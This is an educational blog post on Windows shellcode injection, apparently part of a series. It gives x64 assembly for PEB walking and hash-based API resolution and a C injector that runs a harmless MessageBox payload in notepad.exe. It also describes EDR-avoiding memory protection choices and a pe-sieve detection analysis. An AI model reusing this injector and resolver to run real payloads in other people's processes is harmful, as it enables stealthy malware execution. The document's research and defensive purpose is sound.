---
title: "Shellcode Injection"
date: 2026-08-10 04:00:00 +0900
categories: [Process Injection]
tags: [windows, process-injection, shellcode-injection, mitre-t1055]
---

## Overview
Shellcode injection([T1055](https://attack.mitre.org/techniques/T1055/)) is a process injection technique. Instead of pointing the target at a DLL on disk, you copy the code itself into the target and run it there. Nothing is written to disk, and the payload is no longer limited to a function that takes one argument.

The cost is that the code has to survive on its own. It lands in a bare page with no imports and no fixed load address, so it has to find every API it needs at run time. This write-up shows how to implement the technique in x64 assembly with a C injector on Windows 10. 

> This series is written for security research and education. All code is run
> against processes on machines I control, inside an isolated VM. Do not use
> these techniques against systems you do not own or have explicit permission to test.
{: .prompt-warning}

## Background
Normal code never resolves an API itself. The compiler emits a call through the import table, and the loader fills that table with real addresses while the image is being mapped. By the time `main` runs, every imported function already has an address sitting in memory.

Injected shellcode gets none of that. `WriteProcessMemory` copies bytes into a page; it does not map an image, so no loader ever looks at the payload and there is no import table to fill. The code wakes up in the target with no addresses at all.

Hardcoding them is not an option either. ASLR picks a new base for `kernel32.dll` on every boot, so an address baked into the payload is correct only on the machine it was built on, and only until the next restart. It has to be resolved at run time, inside the target.

The way in is that the target already knows where its own modules are. Every thread has a TEB, and on x64 the `GS` segment points at it. The TEB holds a pointer to the PEB, the PEB holds a pointer to the loader's data, and the loader keeps a linked list of every module mapped into the process, each entry carrying the module's base address. None of this needs an API call - it is all reachable by dereferencing pointers from a fixed offset. That is how the payload finds `kernel32.dll`.

A base address alone is not enough, because a function's offset inside a DLL changes between Windows builds. But the module is a PE image, and a PE image describes its own exports. The export directory holds three parallel tables: one of name strings, one of function addresses, and one that maps between them. The mapping table is the part that is easy to dismiss as redundant. It is not, because the two tables it connects are not in the same order - names are sorted alphabetically so they can be binary-searched, while addresses are laid out in ordinal order. Finding a name at index *i* therefore does not mean the address lives at index *i*; it means looking up the ordinal stored alongside that name, and using the ordinal to index the address table.

## How it works
1. `OpenProcess` - obtain a handle to the target process.
2. `VirtualAllocEx` - allocate writable memory inside the target (`PAGE_READWRITE`)
3. `WriteProcessMemory` - write the shellcode into that memory
4. `VirtualProtectEx` - flip the page to executable (`PAGE_EXECUTE_READ`)
5. `CreateRemoteThread` - execute it

The page is never writable and executable at the same time. Allocating `PAGE_EXECUTE_READWRITE` once would collapse steps 2 and 4 into one call, but RWX private memory in a remote process is one of the loudest signals an EDR can look for.

Note also what the thread starts at. In DLL injection the start address was `LoadLibraryW`, a documented function inside a signed system DLL. Here it points at the buffer from step 2.

That is the injector's half. The payload's half begins when the thread starts, and it begins with nothing:

1. Walk the PEB to find the base address of `kernel32.dll`.
2. Parse its export directory and locate `LoadLibraryA` by name hash.
3. Call it to load `user32.dll`, which is not guaranteed to be mapped in the target.
4. Repeat the export walk on `user32.dll` to locate `MessageBoxA`.
5. Build the argument strings on the stack and call it.

Names are matched by hash rather than compared as strings. A hash is a single constant no matter how long the name is, while a string has to be assembled one instruction per character, and it keeps readable API names out of the payload.

## Implementation
> The full source is in the [repository](https://github.com/GloamRaven/windows-process-injection/tree/main/02-shellcode-injection). Below I only annotate the parts that are not obvious from the API names.

**Walking the PEB**

```nasm
	mov rax, gs : [rax+60h]					; peb
	mov rax, [rax + 18h]					; peb_ldr_data
	mov rax, [rax + 10h]					; .exe inloadordermodulelist
	mov rbx, [rax]							; ntdll.dll inloadordermodulelist
	mov rbx, [rbx]							; kernel32.dll inloadordermodulelist
	mov rbx, [rbx + 30h]					; kernel32.dll base adr
```

On x64 the TEB is always reachable through the GS segment, and the PEB pointer sits at GS:[0x60]. From there the chain to a module base is three dereferences: PEB->Ldr at +0x18, PEB_LDR_DATA->InLoadOrderModuleList at +0x10, then two Flink hops to reach the third entry in the list.

The load order is stable in practice: the first entry is the host process image itself, the second is ntdll.dll, and the third is kernel32.dll. That ordering is a property of how the loader initializes a process, not something the API guarantees, so it is worth treating as an assumption the shellcode makes rather than a fact.

One detail that makes InLoadOrderModuleList the convenient list to walk: InLoadOrderLinks sits at offset 0 of LDR_DATA_TABLE_ENTRY, so the LIST_ENTRY pointer is the entry pointer and DllBase can be read directly at +0x30. Walking InMemoryOrderModuleList instead would mean subtracting 0x10 from every link before touching any field, because those links sit in the middle of the structure. Same result, one more thing to get wrong.

**Resolving exports through the ordinal table**

```nasm
	mov edi, dword ptr [rbx + 3ch]			; pe header
	add rdi, rbx
	xor r8, r8
	add r8, rdi
	add r8, 40h
	mov edi, dword ptr [r8 + 48h]			; Export Table
	add rdi, rbx
	mov [rbp + 18h], rdi
	mov esi, dword ptr [rdi + 20h]			; Export name Table
	add rsi, rbx
	mov ecx, dword ptr [rdi + 24h]			; Ordinal Table
	add rcx, rbx
...
loop_ent:
	mov r10, [rbp + 18h]
	cmp edx, dword ptr [r10 + 18h]	; rdx >= NumberOfNames ?
    jae not_found
	inc rdx
	mov eax, dword ptr [rsi]		; name RVA
	add rsi, 4
	add rbx, rax					; rbx = base + name RVA
	mov rsi, rbx  
...
    ; Found: name index = RDX - 1
	movzx rdx, word ptr [rcx + rdx * 2 - 2]	; ordinal
	mov rdi, [rbp + 18h]
	xor rsi, rsi
	mov esi, dword ptr [rdi + 1ch]			; AddressOfFunctions RVA
	mov rdi, rbx
	add rsi, rdi							; -> absolute
	xor rbx, rbx
	mov ebx, dword ptr [rsi + rdx * 4]		; function RVA
	add rdi, rbx
	mov rax, rdi
	ret  
```

The export directory does not give you a name-to-address map. It gives you three parallel arrays, and only two of them are parallel to each other:

- AddressOfNames - RVAs of the exported name strings, sorted alphabetically
- AddressOfNameOrdinals - 16-bit indices, parallel to AddressOfNames
- AddressOfFunctions - RVAs of the actual code, indexed by ordinal

So a lookup is three steps, not two. Find index i in AddressOfNames where the name matches, read ordinal = AddressOfNameOrdinals[i], then read AddressOfFunctions[ordinal].

The tempting shortcut is to use i directly against AddressOfFunctions. It compiles, it runs, and it returns a valid function pointer - just the wrong one. The two arrays are not the same length either: a DLL can export by ordinal only, so AddressOfFunctions is generally larger than AddressOfNames. The mismatch does not announce itself; you find out when a call lands somewhere unexpected.

**Hashing API names**

```nasm
	xor rdi, rdi
	add di, 496h
	call get_func_addr						; get loadlibrary address
...
hash:
	mov al, byte ptr [rsi]
	add rsi, 1
	add rdi, rax
	test al, al
	jnz hash
	mov qword ptr [rbp + 10h], rdi	; Store the calculated hash in the scratch space
```

The resolver matches functions by hashing the export name instead of comparing strings. Two reasons: a hash constant is 4 bytes where "LoadLibraryA" is 13, and the shellcode carries no plaintext API names for a scanner to pattern-match on.

The hash here is a plain byte sum:

- LoadLibraryA → 0x496
- MessageBoxA → 0x42F

This keeps the hash code small and avoids embedding plaintext strings in the shellcode.

**Stack alignment and shadow space**

```nasm
start:
	push rbp
	push rbx
	push rsi
	push rdi
	mov rax, rsp							; Save the original RSP
	sub rsp, 70h							; Scratch space
	and rsp, 0FFFFFFFFFFFFFFF0h				; Align the stack to a 16-byte boundary
	mov rbp, rsp							; RBP = scratch base
	sub rsp, 40h							; Shadow space shared by all subsequent calls
	mov [rbp+8], rax						; Save the original RSP
```

This is where the shellcode failed first, and the failure is not obvious from the crash.

The x64 calling convention requires RSP to be 16-byte aligned at the point of a call, and requires the caller to leave 32 bytes of shadow space above the return address for the callee to spill RCX/RDX/R8/R9 into. Miss the shadow space and the callee corrupts your stack. Miss the alignment and most functions still work - until one of them executes an SSE instruction with a 16-byte-aligned memory operand. MessageBoxA does, somewhere deep inside user32.dll, and the access violation surfaces in a module you never wrote, several frames below your own code.

The prologue therefore does three things: pushes the callee-saved registers it intends to use, forces alignment with a mask rather than by counting pushes, and carves the frame in two steps: 0x70 for locals, then RBP anchored at that boundary, then 0x40 for the call area. Splitting it keeps local offsets independent of the shadow space - locals are addressed from RBP upward, and everything below RSP is territory the callee is free to trash. Masking RSP instead of arithmetic matters because the shellcode cannot assume how RtlUserThreadStart left the stack; the mask is correct regardless. Since masking destroys the original RSP, it gets saved into one of the callee-saved registers so the epilogue can restore it exactly.

**Building strings on the stack**

```nasm
	xor rax, rax
	mov qword ptr[rbp+20h], rax
	mov qword ptr[rbp+28h], rax
	mov byte ptr[rbp+20h], 75h	; u
	mov byte ptr[rbp+21h], 73h	; s
	mov byte ptr[rbp+22h], 65h	; e
	mov byte ptr[rbp+23h], 72h	; r
	mov byte ptr[rbp+24h], 33h	; 3
	mov byte ptr[rbp+25h], 32h	; 2
	mov byte ptr[rbp+26h], 2eh	; .
	mov byte ptr[rbp+27h], 64h	; d
	mov byte ptr[rbp+28h], 6ch	; l
	mov byte ptr[rbp+29h], 6ch	; l
	lea rcx, [rbp+20h]
	call qword ptr[rbp + 48h]	; call loadlibrary
...
	xor rax, rax
	xor rcx, rcx
	xor rdx, rdx
	mov qword ptr[rbp+28h], rax
	mov byte ptr[rbp+28h], 43h
	mov byte ptr[rbp+29h], 61h
	mov byte ptr[rbp+2ah], 77h
	mov byte ptr[rbp+2bh], 21h
	mov byte ptr[rbp+2ch], 20h
	mov byte ptr[rbp+2dh], 43h
	mov byte ptr[rbp+2eh], 61h
	mov byte ptr[rbp+2fh], 77h
	xor r8, r8
	mov qword ptr[rbp+30h], rcx
	mov byte ptr[rbp+30h], 21h
	mov byte ptr[rbp+32h], 47h
	mov byte ptr[rbp+33h], 6ch
	mov byte ptr[rbp+34h], 6fh
	mov byte ptr[rbp+35h], 61h
	mov byte ptr[rbp+36h], 6dh
	mov byte ptr[rbp+37h], 52h
	mov byte ptr[rbp+38h], 61h
	mov byte ptr[rbp+39h], 76h
	mov byte ptr[rbp+3ah], 65h
	mov byte ptr[rbp+3bh], 6eh
	mov byte ptr[rbp+3ch], 0h
	xor r9, r9
	lea rdx, [rbp+28h]
	lea r8, [rbp+32h]
	call qword ptr[rbp+50h]	; call messageBoxA(0, 'Caw! Caw!', 'GloamRaven', 0)
```

Position independence rules out a .data section. Any string referenced by absolute address breaks the moment the bytes land at a different base in the target process, and the extractor copies out a flat blob with no relocations to fix up.

So "user32.dll", "Caw! Caw!", and "GloamRaven" are constructed at runtime by writing bytes into the scratch space allocated in the prologue, then passing the stack address as the argument. Two details are easy to lose: the null terminator has to be written explicitly, since nothing else is going to, and the scratch area must be large enough for the longest string plus its terminator - this is part of what the 0x70 in the prologue is for.

Writing them as immediate stores also means the strings never appear as contiguous ASCII in the shellcode blob. That is a side effect rather than the goal, but it does raise the bar for a naive string scan.

**Two-stage memory protection**

```c
	pMem = VirtualAllocEx(hProc, NULL, codeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!WriteProcessMemory(hProc, pMem, shellcode, codeSize, NULL)) {
		wprintf(L"WriteProcessMemory failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}
	DWORD oldProtect;
	if (!VirtualProtectEx(hProc, pMem, codeSize, PAGE_EXECUTE_READ, &oldProtect)) {
		wprintf(L"VirtualProtectEx failed. Error: %lu\n", GetLastError());
		goto cleanup;
	}
	FlushInstructionCache(hProc, pMem, codeSize);
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);    
```

The injector allocates with PAGE_READWRITE, writes the shellcode, then flips the region to PAGE_EXECUTE_READ before creating the thread.

Allocating PAGE_EXECUTE_READWRITE up front would remove a call and work identically. It is also one of the cheapest heuristics an EDR has: a remote VirtualAllocEx requesting RWX into another process is close to a signature on its own. The two-stage version never holds a page that is simultaneously writable and executable, which is both the normal behavior of a loader and a weaker signal.

**Extracting the bytes**

```c
	size_t len = (size_t)(SHELL_END - SHELL);

	printf("// %zu bytes\n", len);
	printf("unsigned char shellcode[] = {\n");
	for (size_t i = 0; i < len; i++) {
		printf("%s0x%02X%s",
			(i % 12 == 0) ? "    " : " ",
			SHELL[i],
			(i == len - 1) ? "\n" : ((i % 12 == 11) ? ",\n" : ","));
	}
	printf("};\n");
```

The shellcode is bracketed by two labels, SHELL and SHELL_END. The extractor links against shell.obj, takes the address of both symbols, and computes the length as the difference - so the byte count is whatever the assembler actually produced, and it updates itself every time the shellcode changes.

The alternative most write-ups use is dumping the object with objdump and pasting hex into a header by hand. That works exactly once. Every subsequent edit is an opportunity to copy a stale blob, and a truncated shellcode fails in ways that look like a logic bug rather than a build bug. Generating shellcode.h as a build step removes the failure mode entirely.

## Demo
![MessageBox displayed from notepad.exe](/assets/img/shellcode-injection/demo.PNG){: .shadow}
_After running the injector, the message box appears inside notepad.exe._

## Detection
None of the techniques in this shellcode are evasion. PEB walking and hash-based
resolution solve the problem of running without a loader; they were never solutions
to the problem of running unnoticed. This section separates the two, and where it
makes a claim about what a defender sees, that claim comes from scanning the running
process rather than from reading about it.

What I tested: System Informer for memory layout, and pe-sieve 0.4.1.1 against the
injected process while the message box was still on screen. What I did not test: any
commercial EDR. Nothing here is a measured detection rate.

### Static byte patterns are the weakest signal, and not for the reason usually given

The standard claim is that `mov rax, gs:[60h]` assembles to a fixed nine-byte
sequence that every scanner matches:

```
65 48 8B 04 25 60 00 00 00
```

My shellcode does not contain those bytes. It contains these:

```
48 33 C0           xor rax, rax
65 48 8B 40 60     mov rax, gs:[rax+60h]
```

The absolute form encodes its displacement as a 32-bit value, so `0x60` becomes
`60 00 00 00` - three null bytes. The register-relative form uses an 8-bit
displacement and contains none. Null-free output is a convention rather than a
requirement here, since the injector writes the payload with `WriteProcessMemory` and
would tolerate embedded zeros, but it is the convention shellcode is written under and
I followed it.

This is the part worth stating plainly: **I did not choose that encoding to defeat a
signature.** I chose it to avoid null bytes. A rule written against the nine-byte
absolute form misses this shellcode anyway. Static patterns on PEB access are weak not
because attackers work to evade them, but because the constraints shellcode is already
written under scatter the encodings for free.

What does not vary is narrower and more useful: any path to the PEB goes through a
`gs:` prefix and an offset of `0x60`, or through `0x30` for the TEB first. That is a
wider target than a byte string but still a small one.

The hash constants are a second static artifact, and hashing does less than it appears
to. Removing `"LoadLibraryA"` does not remove the reference to it - a 13-byte string
becomes a 4-byte immediate that is matchable in exactly the same way, and the hash
routine sits in the shellcode in plaintext because the code cannot run without it.
Anyone who reads that loop recovers the algorithm; for a byte sum, reversing the
constant to a name is a few lines of script. Hashing raises the cost of a `strings`
pass. I would not assume it raises the cost of a signature.

### Memory properties survive everything the bytes can do

![The injected region and its contents in System Informer](/assets/img/shellcode-injection/SystemInformer.PNG){: .shadow}
*The payload sitting in the target process, shown as `Private` and executable. No file on disk corresponds to this region and no loaded module claims it - the two properties pe-sieve reports as MEM_PRIVATE and is_listed_module: 0.*

pe-sieve flagged that region without being told where to look:

```json
"module" : "1853a830000",
"is_listed_module" : 0,
"mapping_type" : "MEM_PRIVATE",
"protection" : "20"
```

![pe-sieve summary against a clean notepad.exe](/assets/img/shellcode-injection/PE-sieve-clean.PNG){: .shadow}

![Injector output and pe-sieve summary against the injected process](/assets/img/shellcode-injection/PE-sieve.PNG){: .shadow}
*The same command with the same flags, against a clean `notepad.exe` and against the
injected one. The address the injector gets back from `VirtualAllocEx` is the name
pe-sieve gives its dump file, and `Implanted shc: 2` is that single region reported
twice - the working-set scan reached it by walking memory, the thread scan by
inspecting a call stack.*

`MEM_PRIVATE` with `is_listed_module: 0` means the region has no file behind it and
belongs to no loaded module. Executable memory with no backing image is an anomaly
ordinary programs do not produce - compiled code is mapped from a file, and the
exceptions (JIT engines) are a short, enumerable list.

`0x20` is `PAGE_EXECUTE_READ`, and that value is the interesting one, because the
injector deliberately avoids `PAGE_EXECUTE_READWRITE`. It allocates RW, writes the
payload, then flips to RX with `VirtualProtect`. That defeats a rule looking for RWX
and nothing else.

It does not defeat much else. The thread scan reports `"protection" : "4"` for the same
region - `PAGE_READWRITE`. The two numbers are the two protection fields in
`MEMORY_BASIC_INFORMATION`: `Protect` is the region's current protection,
`AllocationProtect` is what it was allocated with, and that one is never updated
afterward. A single `VirtualQuery` returns both. A region allocated `PAGE_READWRITE`
and now sitting at `PAGE_EXECUTE_READ` describes, in two fields, exactly what happened
to it: something wrote code there and then made it executable. Mapped image code has no
reason to show that mismatch. The two-stage allocation does not remove the anomaly, it
renames it into something more specific.

None of this depends on what the shellcode contains. Re-encoding the PEB access,
changing the hash algorithm, or encrypting the payload and decrypting it in place
leaves every one of these fields unchanged.

### The origin of a call is the strongest signal

The thread scan caught the payload a second way, while the message box was waiting on
user input:

```json
"indicators" : ["SUS_START", "SUS_CALLSTACK_SHC"],
"susp_addr" : "1853a8301e9"
```

The call stack shows why. Every frame resolves to a module except one:

```
1853a8301e9;  +0x1e9
7ffe0945c12e; user32.dll!MessageBoxA+0x4e
7ffe0945c518; user32.dll!MessageBoxTimeoutA+0x108
...
```

`1853a8301e9` is `0x1e9` bytes into the region dumped above, and it has no module name
in front of it because no module claims it. It is the return address `MessageBoxA` will
come back to. The stack records, as a plain fact, that this call originated in memory
that is not part of any image.

`SUS_START` is the same observation applied to the thread's entry point.
`RtlUserThreadStart` still sits at the bottom of the stack - it wraps every thread,
injected or not - but the routine it was handed is in the same unbacked region, and
that address can be read directly with `NtQueryInformationThread` without walking
anything.

This is the layer that obfuscation cannot reach, because it is not a property of the
code. The shellcode exists in order to call APIs, calling an API leaves the caller's
address on the stack, and the caller's address is in memory with no file behind it.
The only way to avoid the trace is to not do the work.

It is also the layer I would expect to produce the fewest false positives. Running code
out of unbacked memory is uncommon to begin with, and the only category I know of that
does it routinely is JIT engines - a short enough list for a defender to enumerate,
which is not true of the byte patterns above.

### What this shellcode does not attempt

The scans above cover static content, memory properties, and call origin. This payload
addresses only the first, and only incidentally. Its memory stays private and
executable for its entire lifetime, and every API call it makes originates there.

Working on the other two layers means changing the approach rather than the encoding -
executing from memory that a legitimate module backs, or presenting a call stack that
walks back into one instead of dead-ending in private memory. Module stomping and call
stack spoofing are the usual names for those directions, and each is its own project.

## Limitations
This is a learning implementation. Where the edges are:

**The hash is a byte sum, so order does not affect the result.** Any two export names
built from the same characters produce the same value. The resolver takes the first
match it finds while walking the name array, so a collision does not fail loudly. It
returns the wrong function pointer and the call goes somewhere unintended. With two
targets the risk is small, but it is unmanaged: nothing in the code can distinguish a
correct match from a colliding one. ROR13 costs a few instructions and makes order
matter, which removes this case. It does not eliminate collisions in general; no hash
that maps arbitrary-length names into 32 bits can.

**The hash constants are the same in every build.** `0x496` and `0x42F` are baked in,
so a rule written against those immediates matches every copy of this shellcode. Mixing
a per-build random seed into the hash would make the constants differ between samples:
`f(name, seed)` rather than `f(name)`. This implementation does not do that, which is
the gap behind the static-signature discussion above.

Smaller ones:

- **Forwarded exports are not handled.** Some export entries point at a string naming
  another DLL rather than at code; `kernel32.dll` forwards many of its exports to
  `kernelbase.dll` this way. Calling one without resolving it jumps into text. Neither
  of the two functions here is a forwarder, which is why it has not surfaced.
- **Ordinal-only exports are unreachable.** The resolver walks `AddressOfNames`, so
  anything exported without a name cannot be found by hashing.
- **ANSI only.** `LoadLibraryA` and `MessageBoxA` were chosen because ASCII literals are
  smaller to embed.

## References
- [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
- [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
- [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

## GitHub
[GloamRaven/windows-process-injection/02-shellcode-injection](https://github.com/GloamRaven/windows-process-injection/tree/main/02-shellcode-injection)